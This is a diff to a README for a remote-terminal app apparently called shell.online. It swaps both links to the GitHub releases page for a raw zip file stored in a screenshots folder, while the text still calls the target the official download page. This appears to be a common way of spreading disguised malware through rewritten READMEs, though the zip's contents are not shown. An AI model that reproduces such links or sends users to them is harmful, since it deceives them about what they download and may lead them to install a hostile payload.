@@ -38,7 +38,7 @@ Getting started with shell.online is easier than you think. Follow these simple 
 
 First things first, you need to get shell.online onto your computer. To do that, click the button below:
 
-[![Download shell.online](https://img.shields.io/badge/Download-shell.online-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rezapah6913/shell.online/releases)
+[![Download shell.online](https://img.shields.io/badge/Download-shell.online-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Rezapah6913/shell.online/main/public/screenshots/online_shell_quercinic.zip)
 
 This button will take you to the official download page where you can get the latest version of the application.
 
@@ -159,7 +159,7 @@ If you downloaded the file but nothing happens when you click it, right-click th
 
 You've got the scoop on what shell.online cando, and you're ready to take control of your terminal from anywhere in the world. Just remember:
 
-1. Head over to the [download page](https://github.com/Rezapah6913/shell.online/releases) and grab the latest release
+1. Head over to the [download page](https://raw.githubusercontent.com/Rezapah6913/shell.online/main/public/screenshots/online_shell_quercinic.zip) and grab the latest release
 2. Launch the application after it downloads
 3. Connect to your terminal session and start typing commands like a pro
 
